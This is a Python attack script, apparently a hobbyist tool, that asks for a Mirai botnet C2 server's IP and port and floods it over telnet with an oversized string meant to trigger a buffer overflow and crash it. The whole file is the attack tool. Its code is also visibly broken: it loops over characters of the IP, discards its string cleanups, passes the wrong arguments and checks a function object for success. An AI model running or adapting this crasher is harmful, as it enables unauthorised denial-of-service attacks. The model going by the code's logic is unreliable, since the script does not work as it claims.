# Project Name: Mirai C2 Crasher
# Project Author: VoidLSD
# Project Reason: Mirai C2 Crasher exploits a certain part of the code to cause buffer overflow.

import os
import time
import colorama
import telnetlib
import random
from colorama import Fore
from threading import Thread

intro = f"""
{Fore.RED}███╗   ███╗ ██████╗ █████╗
{Fore.GREEN}████╗ ████║██╔════╝██╔════╝
{Fore.RED}██╔████╔██║██║     ██
{Fore.GREEN}██║╚██╔╝██║██║     ██
{Fore.RED}██║ ╚═╝ ██║╚██████╗╚█████╗
{Fore.GREEN}╚═╝     ╚═╝ ╚═════╝ ╚═════╝
{Fore.RED}    Mirai C2 Crasher
{Fore.GREEN}   Created By VoidLSD
"""
os.system("clear")
print(intro)

c2ip = input(("C2 IP: "))
c2port = input(("C2 Port: "))
payload = "void"+"d"*9999
timeout = 3
tn = telnetlib.Telnet()

def crash(crasher):
	tn.open(crasher, c2port, timeout)
	tn.write(payload)

for crasher in c2ip:
	crasher.replace("https://", "")
	crasher.replace("http://", "")
	crasher.replace("/", "")
	crasher2 = Thread(target=crash, args=(c2ip, c2port))
	crasher2.start()
	if crash == 0:
		print(Fore.GREEN+"C2 has been successfully crashed!")
	else:
		print(Fore.RED+"did not connect, did you put the C2 IP correctly?")
